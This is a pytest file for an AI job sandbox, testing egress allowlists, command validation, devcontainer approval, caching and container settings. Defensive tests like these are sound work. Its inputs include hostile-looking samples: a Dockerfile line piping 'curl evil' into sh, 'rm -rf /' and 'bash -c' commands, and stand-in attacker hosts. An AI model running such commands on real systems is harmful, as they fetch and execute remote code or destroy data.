"""Universal sandbox (job_mode_plan.md, W9): repository-declared sandbox keys, toolchain detection,
devcontainer sources behind approval, the shared dependency cache, the engine's Unix-socket API,
the container CLI helper (Docker/Podman, SELinux) and the Doctor host checks. No real Docker."""
import http.server
import json
import os
import socketserver
import subprocess
import tempfile
import threading
import time
from pathlib import Path
from types import SimpleNamespace

import pytest

from mu.jobs.sandbox import cache, cli, detect, devcontainer, repo_config
from mu.jobs.sandbox.policy import SandboxPolicy, container_args, with_build_environment


@pytest.fixture(autouse=True)
def home(tmp_path, monkeypatch):
    monkeypatch.setenv("MUCLI_HOME", str(tmp_path / "home"))
    monkeypatch.setattr(cli, "selinux_enforcing", lambda path=cli.SELINUX_ENFORCE: False)
    monkeypatch.setattr(cli, "is_podman", lambda settings=None, run=None: False)
    return tmp_path / "home"


def _git(repo, *args):
    return subprocess.run(["git", "-C", str(repo), "-c", "user.name=t", "-c", "user.email=t@t", *args],
                          check=True, capture_output=True, text=True).stdout.strip()


def _repo(tmp_path, files=None, name="repo"):
    repo = tmp_path / name
    repo.mkdir()
    _git(repo, "init", "-q")
    for rel, text in ({"app.py": "print('hi')\n"} | (files or {})).items():
        (repo / rel).parent.mkdir(parents=True, exist_ok=True)
        (repo / rel).write_text(text)
    _git(repo, "add", "-A")
    _git(repo, "commit", "-qm", "init")
    return repo


def _job(repo, **extra):
    base = _git(repo, "rev-parse", "HEAD")
    return SimpleNamespace(id="abcdef0123456789", repository=str(repo), worktree=str(repo), base_sha=base,
                           metadata={}, execution={}, **extra)


SANDBOX_TOML = """[sandbox]
egress = ["proxy.golang.org", "*.crates.io", "api.openai.com", "bad host", "evil.com/path"]
validation_allowlist = ["./test.sh", "bash scripts/ci.sh", "bash", "make && rm", "env -S x"]
image = "ghcr.io/acme/builder:2"
"""


# ------------------------------------------------------------------ 1. per-repository config


def test_repository_sandbox_keys_come_from_the_base_commit_and_are_validated(tmp_path):
    repo = _repo(tmp_path, {".mucli/jobs.toml": SANDBOX_TOML})
    job = _job(repo)
    found = repo_config.repository_sandbox(job)
    assert found["egress"] == ("proxy.golang.org", "*.crates.io")  # model hosts and junk dropped
    assert found["validation_allowlist"] == ("./test.sh", "bash scripts/ci.sh")  # bare shell / operators refused
    assert found["image"] == "ghcr.io/acme/builder:2"
    # An agent edit in the worktree (even committed by a checkpoint) changes nothing: base commit only.
    (repo / ".mucli/jobs.toml").write_text('[sandbox]\negress = ["attacker.example"]\n')
    _git(repo, "commit", "-qam", "checkpoint")
    assert repo_config.repository_sandbox(job)["egress"] == ("proxy.golang.org", "*.crates.io")


def test_repo_egress_is_merged_with_settings_for_implement_and_checks_only(tmp_path):
    repo = _repo(tmp_path, {".mucli/jobs.toml": SANDBOX_TOML})
    job = _job(repo)
    from mu.jobs.job_settings import save_settings
    save_settings({"sandbox": {"egress_extra": ["pypi.org"]}})
    # Repository egress widens the credential-holding stages: not applied until approved.
    for stage in ("implement", "checks"):
        assert with_build_environment(SandboxPolicy.for_stage(stage), job, None, stage=stage).egress_extra == ("pypi.org",)
    request = repo_config.egress_approval(job)
    assert request["kind"] == "egress" and request["ref"] == "proxy.golang.org, *.crates.io" and not request["approved"]
    from mu.jobs.sandbox.devcontainer import approve
    approve(str(repo), request["fingerprint"], kind="egress", ref=request["ref"])
    for stage in ("implement", "checks"):
        policy = with_build_environment(SandboxPolicy.for_stage(stage), job, None, stage=stage)
        assert policy.egress_extra == ("pypi.org", "proxy.golang.org", "*.crates.io")
    for stage in ("plan", "review"):
        assert with_build_environment(SandboxPolicy.for_stage(stage), job, None, stage=stage).egress_extra == ()


def test_repo_egress_rejects_ip_literals_and_broad_wildcards():
    cleaned = repo_config.clean_egress(["10.0.0.1", "169.254.169.254", "*", "*.com", "*.co.uk", "*.com.au", "1.2.3.4.",
                                        "*.10.0.0", "example.123", "proxy.golang.org", "*.crates.io", "*.acme.co.uk"])
    assert cleaned == ("proxy.golang.org", "*.crates.io", "*.acme.co.uk")


def test_repo_egress_approval_is_per_exact_domain_list_and_offered_in_preview(tmp_path):
    from mu.jobs.sandbox.devcontainer import approve
    from mu.jobs.sandbox.environments import preview
    repo = _repo(tmp_path, {".mucli/jobs.toml": '[sandbox]\negress = ["proxy.golang.org"]\n'})
    job = _job(repo)
    request = repo_config.egress_approval(job)
    offered = [r for r in preview(job).get("approval_required") or [] if r.get("kind") == "egress"]
    assert offered and offered[0]["fingerprint"] == request["fingerprint"] and offered[0]["ref"] == "proxy.golang.org"
    approve(str(repo), request["fingerprint"], kind="egress", ref=request["ref"])
    assert repo_config.approved_repository_egress(job) == ("proxy.golang.org",)
    assert not [r for r in preview(job).get("approval_required") or [] if r.get("kind") == "egress"]
    # A changed list needs approving again.
    (repo / ".mucli/jobs.toml").write_text('[sandbox]\negress = ["proxy.golang.org", "evil.example"]\n')
    _git(repo, "commit", "-qam", "widen")
    widened = _job(repo)
    assert repo_config.approved_repository_egress(widened) == ()
    assert repo_config.egress_approval(widened)["fingerprint"] != request["fingerprint"]


def test_unapproved_repo_egress_is_offered_once_without_parking_the_stage(tmp_path):
    from mu.jobs.sandbox.runner import _offer_repository_egress
    repo = _repo(tmp_path, {".mucli/jobs.toml": '[sandbox]\negress = ["proxy.golang.org"]\n'})
    job = _job(repo)
    events = []
    store = SimpleNamespace(
        list_events_by_type=lambda job_id, kinds: [SimpleNamespace(payload=p) for k, p in events if k in kinds],
        append_event=lambda job_id, kind, reason="", payload=None: events.append((kind, payload)))
    service = SimpleNamespace(store=store)
    for stage in ("plan", "implement", "checks", "implement"):
        _offer_repository_egress(service, job, stage)  # never raises: the stage proceeds without it
    assert [k for k, _ in events] == ["repository_egress_approval_required"]
    assert events[0][1]["kind"] == "egress" and events[0][1]["ref"] == "proxy.golang.org"


def test_cloned_repository_environments_come_from_the_base_commit_and_need_approval(tmp_path, home):
    from mu.jobs.sandbox.environments import (EnvironmentBlocked, _require_approval, is_cloned_repository, preview,
                                              resolve_bindings)
    toml = '[[environments]]\nenv = "image:rust:1.88"\ndocker = true\n'
    repo = _repo(tmp_path, {".mucli/jobs.toml": toml})
    local = _job(repo)
    assert not is_cloned_repository(local)
    bindings, origin = resolve_bindings(local, {})   # the user's own repository: unchanged
    assert origin == "repo" and bindings[0].ref == "rust:1.88" and not bindings[0].approval

    cloned = _job(repo)
    cloned.metadata = {"repository_url": "https://github.com/acme/app.git"}
    assert is_cloned_repository(cloned)
    # Working-tree edits (uncommitted remote content changes) are ignored: base commit only.
    (repo / ".mucli/jobs.toml").write_text('[[environments]]\nenv = "environment:mucli-saved"\n')
    bindings, origin = resolve_bindings(cloned, {})
    assert origin == "repo" and [b.ref for b in bindings] == ["rust:1.88"]
    fp = bindings[0].approval
    assert fp.startswith("environment:")
    events = []
    service = SimpleNamespace(store=SimpleNamespace(append_event=lambda *a, **k: events.append((a, k))))
    with pytest.raises(EnvironmentBlocked, match="Approve") as info:
        _require_approval(service, cloned, bindings)
    approval = info.value.approval
    assert approval["kind"] == "environment" and approval["fingerprint"] == fp and "rust:1.88" in approval["ref"]
    assert any(r["fingerprint"] == fp for r in preview(cloned, settings={})["approval_required"])
    devcontainer.approve(approval["repository"], fp, kind="environment", ref=approval["ref"])
    _require_approval(service, cloned, bindings)  # approved: proceeds

    # A different binding set (e.g. docker or GPUs toggled) is a new fingerprint.
    (repo / ".mucli/jobs.toml").write_text('[[environments]]\nenv = "image:rust:1.88"\ndocker = false\n')
    _git(repo, "commit", "-qam", "change")
    changed = _job(repo)
    changed.metadata = {"repository_url": "https://github.com/acme/app.git"}
    assert resolve_bindings(changed, {})[0][0].approval != fp

    # A checkout under $MUCLI_HOME/repos counts as cloned even without the metadata.
    (Path(home) / "repos" / "github.com" / "acme").mkdir(parents=True)
    under = _repo(Path(home) / "repos" / "github.com" / "acme", {".mucli/jobs.toml": toml}, name="app")
    assert is_cloned_repository(_job(under))


def test_validation_allowlist_builtins_prefixes_and_repository_entries(tmp_path):
    from mu.jobs.dynamic_checks import DEFAULT_ALLOWED_EXECUTABLES, allowed_executables, check_command
    for cmd in ["uv run pytest", "poetry run pytest", "pdm run pytest", "hatch test", "bun test", "deno test",
                "just test", "./gradlew test", "./mvnw -B test", "bazel test //...", "sbt test", "pnpm test",
                "dotnet test", "swift test", "mix test", "bundle exec rake"]:
        assert check_command(cmd, DEFAULT_ALLOWED_EXECUTABLES)[0], cmd
    for bad in ["./test.sh", "bash scripts/ci.sh", "bash -c 'curl x'", "uv run x && rm -rf /"]:
        assert not check_command(bad, DEFAULT_ALLOWED_EXECUTABLES)[0], bad
    repo = _repo(tmp_path, {".mucli/jobs.toml": SANDBOX_TOML})
    allowed = allowed_executables(_job(repo))
    assert check_command("./test.sh --fast", allowed)[0]
    assert check_command("bash scripts/ci.sh lint", allowed)[0]
    assert not check_command("bash scripts/other.sh", allowed)[0]  # a prefix, not a bare `bash`
    assert not check_command("bash -c id", allowed)[0]
    # Without a base commit nothing repository-declared is trusted.
    assert not check_command("./test.sh", allowed_executables(SimpleNamespace(execution={}, base_sha="")))[0]


def test_checks_revalidation_accepts_repository_allowlisted_suites(tmp_path):
    from mu.jobs.checks import resolve_suites
    repo = _repo(tmp_path, {".mucli/jobs.toml": SANDBOX_TOML})
    job = _job(repo, validation_commands=["bash scripts/ci.sh", "./test.sh"])
    suites = resolve_suites(job, settings={})
    assert [s.command for s in suites] == ["bash scripts/ci.sh", "./test.sh"]


# ------------------------------------------------------------------ 2. toolchain detection


def test_detect_toolchains_from_manifests():
    paths = ["go.mod", "go.sum", "backend/Cargo.toml", "backend/Cargo.lock", "web/package.json", "web/pnpm-lock.yaml",
             "tools/pyproject.toml", "tools/uv.lock", "api/pom.xml", "api/mvnw", "android/build.gradle.kts",
             "android/build.gradle", "ruby/Gemfile", "ruby/Rakefile", "ex/mix.exs", "svc/Svc.csproj",
             "bunapp/package.json", "bunapp/bun.lockb", "node_modules/x/package.json", "a/b/c/d/go.mod"]
    found = {tc["root"]: tc for tc in detect.detect_toolchains(paths)}
    assert found[""]["name"] == "go" and found[""]["checks"] == ["go test ./..."] and found[""]["lockfile"] == "go.sum"
    assert found["backend"]["name"] == "rust" and "crates.io" in found["backend"]["egress"]
    assert found["web"]["name"] == "node-pnpm" and found["web"]["validation_allowlist"] == ["pnpm"]
    assert found["tools"]["name"] == "python-uv" and found["tools"]["checks"] == ["uv run pytest"]
    assert found["api"]["name"] == "maven" and found["api"]["checks"] == ["mvn -B test"]
    assert found["android"]["name"] == "gradle" and found["android"]["manifest"] == "android/build.gradle"
    assert found["ruby"]["checks"] == ["bundle exec rake test"] and found["ex"]["name"] == "elixir"
    assert found["svc"]["name"] == "dotnet" and found["bunapp"]["name"] == "bun"
    assert "node_modules/x" not in found and "a/b/c/d" not in found  # vendored and too deep


def test_detect_reads_manifest_contents_when_given_a_reader():
    texts = {"pyproject.toml": "[tool.poetry]\nname = 'x'\n", "package.json": '{"scripts": {"build": "tsc"}}'}
    found = detect.detect_toolchains(["pyproject.toml", "package.json"], texts.get)
    names = {tc["name"]: tc for tc in found}
    assert names["python-poetry"]["checks"] == ["poetry run pytest"]
    assert names["node-npm"]["checks"] == []  # no test script
    root = detect.summary(detect.detect_toolchains(["Cargo.toml", "Cargo.lock"]))
    assert root["base_image"].startswith("rust:") and root["checks"] == ["cargo test"]


def test_planner_hint_and_preview_surface_detected_toolchains(tmp_path):
    from mu.jobs.sandbox.environments import preview
    repo = _repo(tmp_path, {"go.mod": "module x\n"})
    job = _job(repo)
    assert "go test ./..." in detect.planner_hint(job)
    assert preview(job, settings={})["detected"]["toolchains"] == ["go"]


# ------------------------------------------------------------------ 3. devcontainer + approval


DEVCONTAINER = """// a comment
{
  /* block */
  "name": "dev // not a comment",
  "build": {"dockerfile": "Dockerfile", "context": "..", "args": {"VARIANT": "3.12",},},
  "features": {"ghcr.io/devcontainers/features/node:1": {}},
}
"""


def test_jsonc_comments_and_trailing_commas():
    data = devcontainer.parse_jsonc(DEVCONTAINER)
    assert data["name"] == "dev // not a comment" and data["build"]["args"] == {"VARIANT": "3.12"}


def test_devcontainer_spec_kinds_and_unsupported_forms(tmp_path):
    repo = _repo(tmp_path, {".devcontainer/devcontainer.json": DEVCONTAINER, ".devcontainer/Dockerfile": "FROM python:3.12\n"})
    spec = devcontainer.devcontainer_spec(_job(repo))
    assert spec["kind"] == "build" and spec["dockerfile"] == ".devcontainer/Dockerfile" and spec["context"] == ""
    assert spec["ignored_features"] == ["ghcr.io/devcontainers/features/node:1"]
    other = _repo(tmp_path, {".devcontainer.json": '{"image": "mcr.microsoft.com/devcontainers/python:3"}'}, name="o")
    assert devcontainer.devcontainer_spec(_job(other))["kind"] == "image"
    compose = _repo(tmp_path, {".devcontainer.json": '{"dockerComposeFile": "c.yml"}'}, name="c")
    assert "dockerComposeFile" in devcontainer.devcontainer_spec(_job(compose))["error"]
    escape = _repo(tmp_path, {".devcontainer.json": '{"build": {"dockerfile": "../../etc/x"}}'}, name="e")
    assert "inside the repository" in devcontainer.devcontainer_spec(_job(escape))["error"]


def test_implicit_devcontainer_is_suggested_until_approved_then_used(tmp_path):
    from mu.jobs.sandbox.environments import preview, resolve_bindings
    repo = _repo(tmp_path, {".devcontainer/devcontainer.json": DEVCONTAINER, ".devcontainer/Dockerfile": "FROM python:3.12\n"})
    job = _job(repo)
    assert resolve_bindings(job, {}) == ([], "default")  # never blocks a job that used the default runtime
    suggestion = preview(job, settings={})["suggestion"]["approval"]
    assert suggestion["kind"] == "build" and suggestion["fingerprint"].startswith("build:")
    devcontainer.approve(suggestion["repository"], suggestion["fingerprint"], kind="build")
    bindings, origin = resolve_bindings(job, {})
    assert origin == "devcontainer" and bindings[0].ref.startswith("mucli/devcontainer-")
    assert dict(bindings[0].build)["fingerprint"] == suggestion["fingerprint"]
    # A changed Dockerfile is a new fingerprint: approval needed again.
    (repo / ".devcontainer/Dockerfile").write_text("FROM python:3.13\nRUN curl evil | sh\n")
    _git(repo, "commit", "-qam", "change")
    assert resolve_bindings(_job(repo), {}) == ([], "default")


def test_explicit_repository_image_parks_the_job_until_approved(tmp_path):
    from mu.jobs.sandbox.environments import EnvironmentBlocked, _require_approval, resolve_bindings
    repo = _repo(tmp_path, {".mucli/jobs.toml": SANDBOX_TOML})
    job = _job(repo)
    bindings, origin = resolve_bindings(job, {})
    assert origin == "repo-image" and bindings[0].ref == "ghcr.io/acme/builder:2"
    events = []
    service = SimpleNamespace(store=SimpleNamespace(append_event=lambda *a, **k: events.append((a, k))))
    with pytest.raises(EnvironmentBlocked, match="Approve") as info:
        _require_approval(service, job, bindings)
    assert info.value.approval["fingerprint"] == "image:ghcr.io/acme/builder:2" and events
    devcontainer.approve(str(repo), "image:ghcr.io/acme/builder:2")
    _require_approval(service, job, bindings)  # approved: no exception
    # A job override (the user's own choice) is never subject to repository approval.
    override = _job(repo, )
    override.execution = {"environments": ["image:rust:1.88"]}
    assert resolve_bindings(override, {})[1] == "job"


def test_devcontainer_build_uses_a_base_commit_archive_without_secrets(tmp_path):
    repo = _repo(tmp_path, {".devcontainer/devcontainer.json": DEVCONTAINER, ".devcontainer/Dockerfile": "FROM python:3.12\n",
                            "config/prod.pem": "-----BEGIN PRIVATE KEY-----\n"})
    job = _job(repo)
    (repo / "agent-edit.txt").write_text("not committed at base")
    spec = devcontainer.devcontainer_spec(job)
    seen = {}

    def run(args, **kwargs):
        if args[0] == "git":
            return subprocess.run(args, **kwargs)
        context = Path(args[-1])
        seen.update(args=args, files=sorted(str(p.relative_to(context)) for p in context.rglob("*") if p.is_file()))
        return subprocess.CompletedProcess(args, 0, "built", "")
    tag = devcontainer.build_devcontainer(job, spec, "mucli/devcontainer-x:1", {"io.mucli.role": "devcontainer-base"}, run=run)
    assert tag == "mucli/devcontainer-x:1"
    assert "--build-arg" in seen["args"] and "VARIANT=3.12" in seen["args"] and "--pull=false" in seen["args"]
    assert "app.py" in seen["files"] and "agent-edit.txt" not in seen["files"]
    assert "config/prod.pem" not in seen["files"]  # tracked secrets never enter a build context


# ------------------------------------------------------------------ 4. shared dependency cache


def test_shared_cache_is_keyed_by_repository_toolchain_and_lockfiles(tmp_path):
    repo = _repo(tmp_path, {"Cargo.toml": "[package]\n", "Cargo.lock": "v1\n"})
    first, second = _job(repo), _job(repo)
    second.id = "ffffffffffff0000"
    state = {"name": "rust", "source": "image", "ref": "rust:1", "job_image": "img", "status": "ready"}
    a = with_build_environment(SandboxPolicy.for_stage("implement"), first, state, stage="implement").cache_dir
    b = with_build_environment(SandboxPolicy.for_stage("checks"), second, state, stage="checks").cache_dir
    assert a == b and a.startswith(str(cache.cache_root()))  # reused across jobs and stages
    (repo / "Cargo.lock").write_text("v2\n")
    _git(repo, "commit", "-qam", "bump")
    c = with_build_environment(SandboxPolicy.for_stage("checks"), _job(repo), state, stage="checks").cache_dir
    assert c != a
    other = with_build_environment(SandboxPolicy.for_stage("checks"), first, {**state, "ref": "rust:2"}, stage="checks")
    assert other.cache_dir != a  # a re-pointed binding never reuses another toolchain's cache
    for stage in ("plan", "review"):
        assert with_build_environment(SandboxPolicy.for_stage(stage), first, state, stage=stage).cache_dir == ""
    runtime = with_build_environment(SandboxPolicy.for_stage("implement"), first, None, stage="implement")
    assert "/runtime/" in runtime.cache_dir  # the shared runtime image gets a cache too


def test_container_args_set_cache_env_and_a_per_job_cargo_target(tmp_path):
    dirs = [tmp_path / n for n in ("ws", "in", "out", "relay", "cache")]
    for d in dirs:
        d.mkdir()
    policy = SandboxPolicy(cache_dir=str(dirs[4]), job_id="abcdef0123456789")
    rendered = " ".join(container_args("n", "implement", *map(str, dirs[:4]), policy, ""))
    for key in ("PIP_CACHE_DIR=/cache/pip", "UV_CACHE_DIR=/cache/uv", "npm_config_cache=/cache/npm",
                "YARN_CACHE_FOLDER=/cache/yarn", "PNPM_STORE_DIR=/cache/pnpm-store", "CARGO_HOME=/cache/cargo",
                "GOMODCACHE=/cache/go/pkg/mod", "GOCACHE=/cache/go-build", "GRADLE_USER_HOME=/cache/gradle",
                "MAVEN_OPTS=-Dmaven.repo.local=/cache/m2", "CARGO_TARGET_DIR=/cache/target/abcdef012345"):
        assert key in rendered, key


def test_cache_prune_is_lru_and_spares_recent_and_kept_entries(tmp_path):
    root = tmp_path / "deps"
    now = time.time()
    sizes = {"old": (now - 10 * 86400), "mid": (now - 5 * 86400), "new": (now - 60), "kept": (now - 20 * 86400)}
    paths = {}
    for name, used in sizes.items():
        path = root / "repo" / "tool" / name
        path.mkdir(parents=True)
        (path / "blob").write_bytes(b"x" * 100_000)
        (path / cache.STAMP).write_text(str(used))
        paths[name] = path
    report = cache.prune(250_000, keep=(paths["kept"],), force=True, now=now, root=root)
    assert set(report["pruned"]) == {str(paths["old"]), str(paths["mid"])}
    assert paths["new"].is_dir() and paths["kept"].is_dir()
    assert cache.prune(1, now=now + 10, root=root).get("skipped")  # throttled
    assert cache.prune(0, force=True, now=now, root=root)["pruned"] == []  # 0 = unlimited


def test_cleanup_removes_the_jobs_build_output_from_the_shared_cache(tmp_path, monkeypatch):
    entry = cache.entry_dir("repo-1", "rust", "nolock")
    (entry / "target" / "abcdef012345").mkdir(parents=True)
    (entry / "cargo").mkdir()
    cache.remove_job_targets("abcdef0123456789")
    assert not (entry / "target" / "abcdef012345").exists() and (entry / "cargo").is_dir()


# ------------------------------------------------------------------ 5. engine over a Unix socket


class FakeDocker:
    def __init__(self):
        self.calls = []

    def run(self, *args, **kwargs):
        self.calls.append(args)
        return subprocess.CompletedProcess(args, 0, "", "")

    def exists(self, kind, ref):
        return True

    def inspect(self, kind, ref, fmt):
        return ""


def test_engine_runs_without_network_and_serves_its_api_on_a_mounted_socket(tmp_path, monkeypatch):
    from mu.jobs.sandbox import engine
    monkeypatch.setenv("XDG_RUNTIME_DIR", tempfile.mkdtemp(prefix="w9", dir="/tmp"))
    worktree = tmp_path / "wt"
    worktree.mkdir()
    job = SimpleNamespace(id="abcdef0123456789", repository=str(tmp_path), worktree=str(worktree), metadata={}, base_sha="")
    docker = FakeDocker()
    eng = engine.JobEngine(job, [{"name": "it", "docker": True, "source": "image", "ref": "x"}], docker=docker, settings={})
    eng._create()
    run = next(c for c in docker.calls if c[0] == "run")
    rendered = " ".join(run)
    assert "--network none" in rendered and "network" not in [c[0] for c in docker.calls]
    sock_dir = engine.socket_dir(job.id)
    assert f"src={sock_dir},dst=/run/mucli" in rendered and "unix:///run/mucli/docker.sock" in rendered
    assert "tcp://" not in rendered and "--runtime sysbox-runc" in rendered
    assert oct(os.stat(sock_dir.parent).st_mode & 0o777) == "0o700"  # private parent keeps others out
    assert len(eng.address()) < 100 and eng.address().endswith("/docker.sock")
    engine.remove_socket_dir(job.id)
    assert not sock_dir.exists()


def test_engine_http_calls_go_over_the_unix_socket(tmp_path):
    from mu.jobs.sandbox import engine
    path = os.path.join(tempfile.mkdtemp(prefix="w9", dir="/tmp"), "d.sock")

    class Handler(http.server.BaseHTTPRequestHandler):
        def do_GET(self):
            body = b"OK" if self.path == "/_ping" else json.dumps({"LayersSize": 5, "Volumes": [{"UsageData": {"Size": 7}}],
                                                                  "Containers": [{"SizeRw": 3}]}).encode()
            self.send_response(200)
            self.send_header("Content-Length", str(len(body)))
            self.end_headers()
            self.wfile.write(body)

        def log_message(self, *args):
            pass

    class Server(socketserver.ThreadingMixIn, socketserver.UnixStreamServer):
        daemon_threads = True

        def get_request(self):
            request, _ = super().get_request()
            return request, ("local", 0)
    server = Server(path, Handler)
    threading.Thread(target=server.serve_forever, daemon=True).start()
    try:
        job = SimpleNamespace(id="abcdef0123456789", repository="", worktree=str(tmp_path), metadata={})
        eng = engine.JobEngine(job, [], docker=FakeDocker(), settings={})
        eng._wait_ready(path, timeout=5)
        assert eng.storage_used(path) == 15
    finally:
        server.shutdown()
        server.server_close()


def test_engine_refuses_podman_with_a_clear_message(tmp_path, monkeypatch):
    from mu.jobs.sandbox import engine
    from mu.jobs.sandbox.environments import EnvironmentBlocked, _preflight
    monkeypatch.setattr(cli, "is_podman", lambda settings=None, run=None: True)
    job = SimpleNamespace(id="abcdef0123456789", repository="", worktree=str(tmp_path), metadata={})
    with pytest.raises(EnvironmentBlocked, match="Podman"):
        engine.JobEngine(job, [], docker=FakeDocker(), settings={}).ensure()
    with pytest.raises(EnvironmentBlocked, match="Podman"):
        _preflight([{"name": "x", "docker": True}], FakeDocker())


# ------------------------------------------------------------------ 6. container CLI, Podman, SELinux


def test_container_cli_setting_and_auto_detection(monkeypatch):
    present = set()
    monkeypatch.setattr(cli.shutil, "which", lambda name: f"/usr/bin/{name}" if name in present else None)
    assert cli.container_cli({}) == "docker"  # nothing installed: docker (for the error message)
    present.add("podman")
    assert cli.container_cli({}) == "podman"
    present.add("docker")
    assert cli.container_cli({}) == "docker"
    assert cli.container_cli({"jobs": {"container_cli": "podman"}}) == "podman"


def test_bind_mounts_relabel_on_selinux_and_never_system_trees():
    assert cli.bind_mount("/w", "/workspace", True) == ["--mount", "type=bind,src=/w,dst=/workspace,readonly"]
    assert cli.bind_mount("/w", "/workspace", True, selinux=True) == ["-v", "/w:/workspace:ro,z"]
    assert cli.bind_mount("/w", "/cache", False, selinux=True, podman=True) == [
        "--mount", "type=bind,src=/w,dst=/cache,relabel=shared"]
    assert cli.bind_mount("/usr/bin/claude", "/opt/harness/claude", True, selinux=True)[0] == "--mount"
    with pytest.raises(ValueError):
        cli.bind_mount("/a,b", "/x", True)
    with pytest.raises(ValueError):
        cli.bind_mount("/a:b", "/x", True, selinux=True)


def test_container_args_on_selinux_and_rootless_podman(tmp_path, monkeypatch):
    dirs = [tmp_path / n for n in ("ws", "in", "out", "relay")]
    for d in dirs:
        d.mkdir()
    monkeypatch.setattr(cli, "selinux_enforcing", lambda path=cli.SELINUX_ENFORCE: True)
    monkeypatch.setattr(cli, "is_podman", lambda settings=None, run=None: True)
    args = container_args("n", "review", *map(str, dirs), SandboxPolicy(), "")
    assert f"{dirs[0].resolve()}:/workspace" not in " ".join(args)  # podman keeps --mount
    assert f"type=bind,src={dirs[0].resolve()},dst=/workspace,readonly,relabel=shared" in args
    if os.getuid() != 0:
        assert args[args.index("--userns") + 1] == "keep-id"
    assert args[args.index("--user") + 1] == f"{os.getuid()}:{os.getgid()}"


# ------------------------------------------------------------------ 6/7. Doctor


def test_doctor_host_checks(monkeypatch, tmp_path):
    from mu.jobs import setup as jobs_setup
    monkeypatch.setattr(cli.shutil, "which", lambda name: "/usr/bin/docker" if name == "docker" else None)
    monkeypatch.setattr(jobs_setup.shutil, "which", lambda name: "/usr/bin/docker" if name == "docker" else None)
    answers = {"{{json .SecurityOptions}}": '["name=seccomp","name=rootless"]', "{{.DockerRootDir}}": str(tmp_path)}

    def run(args):
        return subprocess.CompletedProcess(args, 0, answers.get(args[-1], ""), "")
    rows = {name: (status, detail) for name, status, detail in jobs_setup.sandbox_host_checks(run)}
    assert rows["container_cli"][0] == "ok" and "/usr/bin/docker" in rows["container_cli"][1]
    assert rows["rootless"][0] == "warn" and "--userns=keep-id" in rows["rootless"][1] and "Permission denied" in rows["rootless"][1]
    assert rows["podman"] == ("ok", "Podman not installed (optional)")
    assert rows["selinux"][1] == "SELinux not enforcing"
    assert "GB free under" in rows["container_data_root"][1]
    assert "4 CPUs" in rows["sandbox_limits"][1] and "memory 8g" in rows["sandbox_limits"][1] \
        and "4096 processes" in rows["sandbox_limits"][1] and "20 GB" in rows["sandbox_limits"][1]
    assert "testcontainers" in rows["service_tests"][1]
    # Podman selected: DinD reported unsupported.
    monkeypatch.setattr(cli, "is_podman", lambda settings=None, run=None: True)
    answers["{{.Host.Security.Rootless}}"] = "true"
    answers["{{.Store.GraphRoot}}"] = str(tmp_path)
    rows = {name: (status, detail) for name, status, detail in jobs_setup.sandbox_host_checks(run)}
    assert rows["podman"][0] == "warn" and "Sysbox" in rows["podman"][1]
    assert "keep-id" in rows["rootless"][1]
    assert jobs_setup.check("dind").detail == jobs_setup.PODMAN_DIND_NOTE
